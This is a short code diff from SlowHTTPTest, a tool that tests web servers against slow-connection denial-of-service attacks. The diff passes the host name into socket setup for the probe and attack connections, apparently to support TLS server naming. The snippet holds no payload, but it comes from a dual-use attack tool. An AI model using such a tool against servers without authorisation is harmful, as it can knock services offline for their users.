@@ -678,7 +678,7 @@ bool SlowHTTPTest::run_test() {
     // init and connect probe socket
     if(!probe_socket_ && probe_taken != seconds_passed_ && seconds_passed_ % probe_timeout_ == 0) {
       probe_socket_ = new SlowSocket();
-      if(probe_socket_->init(addr_, proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd, 0)) {
+      if(probe_socket_->init(addr_, base_uri_.getHost().c_str(), proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd, 0)) {
         probe_socket_->set_state(eConnecting);
         probe_taken = seconds_passed_;
       slowlog(LOG_DEBUG, "%s: created probe socket %d\n",
@@ -721,7 +721,7 @@ bool SlowHTTPTest::run_test() {
     if(num_connected < num_connections_) {
       sock_[num_connected] = new SlowSocket();
       sock_[num_connected]->set_state(eInit);
-      if(!sock_[num_connected]->init(addr_, proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd,
+      if(!sock_[num_connected]->init(addr_, base_uri_.getHost().c_str(), proxy_type_ == eNoProxy ? base_uri_.isSSL() : false, maxfd,
           (eRange == test_type_ || eSlowRead == test_type_) ? 0 : followup_cnt_,
           eSlowRead == test_type_ ? read_interval_ : 0,
           window_lower_limit_, window_upper_limit_)) {
